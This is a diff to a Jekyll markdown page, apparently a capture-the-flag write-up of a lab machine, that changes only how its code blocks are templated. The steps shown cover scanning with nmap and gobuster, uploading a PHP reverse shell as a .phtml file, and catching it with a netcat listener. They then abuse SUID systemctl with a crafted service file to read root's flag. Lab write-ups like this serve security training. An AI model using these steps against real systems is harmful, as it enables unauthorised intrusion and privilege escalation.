@@ -19,7 +19,7 @@ Use these links as references.
 
 
 Using `nmap` as below, all info can be gathered for the task.
-{% capture code %}nmap -Pn -T4 -sV --reason --open <ip>{% endcapture %} {% include code.html code=code lang="bash"%}
+{% capture code %}{% raw %}nmap -Pn -T4 -sV --reason --open <ip>{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 
 ## Task 3 - Locating directories using Gobuster
@@ -30,10 +30,10 @@ Use these links as references.
 
 
 Using `gobuster` and `dirb` wordlists, find the child directories under web root.
-{% capture code %}gobuster dir -u http://<ip>:3333 -w /usr/share/wordlists/dirb/common.txt -q{% endcapture %} {% include code.html code=code lang="bash"%}
+{% capture code %}{% raw %}gobuster dir -u http://<ip>:3333 -w /usr/share/wordlists/dirb/common.txt -q{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 Use either `curl` or browser to load the pages from `gobuster` result and see if anything contains `upload` logic.
-{% capture code %}curl http://<ip>:3333/<dir>/{% endcapture %} {% include code.html code=code lang="bash"%}
+{% capture code %}{% raw %}curl http://<ip>:3333/<dir>/{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 
 ## Task 4 - Compromise the webserver
@@ -55,7 +55,7 @@ This task can be done using `burpsuite`.
 Download the [php reverse shell payload](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php){:target="_blank"},and copy the file under extension `.phtml`. Edit the file and and change ip to local machine ip.
 
 Start a netcat session to listen for reverse proxy connection.
-{% capture code %}nc -lnvp 1234{% endcapture %} {% include code.html code=code lang="bash"%}
+{% capture code %}{% raw %}nc -lnvp 1234{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 Using the url previously found for uploading files, load the url `http://<ip>:3333/<dir>/` in `firefox` and upload payload file, and navigate to the url `http://<ip>:3333/<dir>/uploads/php-reverse-shell.phtml`. A reverse shell should have been created in the `netcat` listening terminal.
 
@@ -67,22 +67,22 @@ The `user` managing the web server and the `flag` can be retrieved from the shel
 Now the webserver is compromised and a shell access is gained. This task shows how to gain privilege escalation using `SUID`.
 
 Find the commands which has `SUID` set. This allows normal user to gain root access temporarily. Any of the below command can be used to find the binaries allowing `SUID`.
-{% capture code %}find / -perm /4000 2>&1 | grep -v “Permission denied”{% endcapture %} {% include code.html code=code lang="bash"%}
-{% capture code %}find / -user root -perm -4000 -exec ls -ldb {} \;{% endcapture %} {% include code.html code=code lang="bash"%}
+{% capture code %}{% raw %}find / -perm /4000 2>&1 | grep -v “Permission denied”{% endraw %}{% endcapture %} {% include code.html code=code %}
+{% capture code %}{% raw %}find / -user root -perm -4000 -exec ls -ldb {} \;{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 Since the binary found is `/bin/systemctl`, create a temporary `service file`, and run it, to gain `SUID` access.
-{% capture code %}eop=$(mktemp).service{% endcapture %} {% include code.html code=code lang="bash"%}
+{% capture code %}{% raw %}eop=$(mktemp).service{% endraw %}{% endcapture %} {% include code.html code=code %}
 
-{% capture code %}echo '[Service]
+{% capture code %}{% raw %}echo '[Service]
 ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
 [Install]
-WantedBy=multi-user.target' > $eop{% endcapture %} {% include code.html code=code lang="bash"%}
+WantedBy=multi-user.target' > $eop{% endraw %}{% endcapture %} {% include code.html code=code %}
 
-{% capture code %}/bin/systemctl link $eop{% endcapture %} {% include code.html code=code lang="bash"%}
+{% capture code %}{% raw %}/bin/systemctl link $eop{% endraw %}{% endcapture %} {% include code.html code=code %}
 
-{% capture code %}/bin/systemctl enable --now $eop{% endcapture %} {% include code.html code=code lang="bash"%}
+{% capture code %}{% raw %}/bin/systemctl enable --now $eop{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 
 Capture the flag from the manipulated output file.
-{% capture code %}cat /tmp/output{% endcapture %} {% include code.html code=code lang="bash"%}
+{% capture code %}{% raw %}cat /tmp/output{% endraw %}{% endcapture %} {% include code.html code=code %}
 
